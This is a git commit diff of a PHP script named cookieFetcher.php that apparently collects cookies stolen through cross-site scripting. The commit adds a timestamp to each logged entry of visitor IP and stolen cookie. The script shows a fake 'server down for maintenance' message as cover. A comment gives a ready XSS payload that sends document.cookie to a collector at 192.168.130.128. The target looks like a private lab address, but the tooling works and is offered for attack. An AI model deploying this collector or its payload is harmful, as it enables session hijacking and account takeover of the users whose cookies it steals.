d2f1f754b3e5f6e5db194a8f8b118831c9b7dc63
brlndtech <brlndtech@gmail.com>
2021-09-22 06:54:57 +0200

    date+ip @

--- cookieFetcher.php
+++ cookieFetcher.php
@@ -1,13 +1,14 @@
 <?php
 
-$cookie = "".$_SERVER['REMOTE_ADDR']." - Cookie(s) : ".$_REQUEST["cookie"]."". PHP_EOL;
+$date = date('d-m-y h:i:s');
+$cookie = "".$date." - ".$_SERVER['REMOTE_ADDR']." - Cookie(s) : ".$_REQUEST["cookie"]."". PHP_EOL;
 $fp = fopen("cookieFetcher.log", "a+");
 fwrite($fp, ''.$cookie.'');
 fclose($fp);
 
 echo "<p> Server is currently down due to a maintenance. Please try again later !"; 
-// <script>document.location="http://192.168.130.128/cookieFether.php?c="+document.cookie</script>
-exit; 
+// exemple of xss injection code : <script>document.location="http://192.168.130.128/cookieFetcher/cookieFetcher.php?cookie="+document.cookie</script>
 
+exit; 
 
 ?>
